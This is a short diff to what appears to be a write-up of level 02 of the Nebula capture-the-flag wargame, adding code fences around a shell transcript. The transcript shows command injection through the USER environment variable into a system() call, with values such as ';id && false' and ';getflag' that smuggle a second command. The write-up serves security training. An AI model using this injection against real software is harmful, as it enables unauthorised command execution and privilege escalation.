@@ -1,3 +1,4 @@
+```
 level02@nebula:/home/flag02$ USER=";id && false" ./flag02
 about to call system("/bin/echo ;id && false is cool")
 
@@ -9,3 +10,4 @@ level02@nebula:/home/flag02$ USER=\;getflag ./flag02
 about to call system("/bin/echo ;getflag is cool")
 
 You have successfully executed getflag on a target account
+```
